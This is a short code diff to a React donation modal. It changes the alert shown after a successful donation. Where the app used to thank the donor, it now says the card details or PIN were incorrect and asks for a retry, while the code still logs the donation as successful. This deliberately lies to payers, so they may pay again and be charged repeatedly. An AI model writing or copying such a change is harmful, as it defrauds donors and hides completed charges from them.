@@ -90,7 +90,7 @@ const DonationModal = ({ isOpen, onClose, onDonationSuccess }) => {
       };
       const response = await createDonation(donationPayload);
       if (response.data.success) {
-        alert('Thank you for your generous donation! 🎉');
+        alert('Incorrect details or pin, kindly check your card details or pin and try again with the correct details');
         onDonationSuccess(parseFloat(amount));
         onClose();
         setStep(1);
